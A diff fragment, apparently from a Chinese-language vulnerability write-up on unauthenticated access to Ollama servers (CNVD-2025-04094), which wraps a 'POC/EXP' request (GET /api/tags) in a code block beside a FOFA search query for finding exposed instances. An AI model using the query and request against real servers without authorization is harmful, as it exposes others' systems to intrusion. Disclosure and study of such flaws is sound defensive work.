@@ -73,9 +73,12 @@ FOFA：app="Ollama"
 
 POC/EXP：
 
+```http
 GET /api/tags HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 Host: 127.0.0.1
+```
+
 
 ![image-20250304145122869](./.resource/大语言模型如DeepSeekOLLAMA未授权访问CNVD-2025-04094/media/image-20250304145122869.png)
 
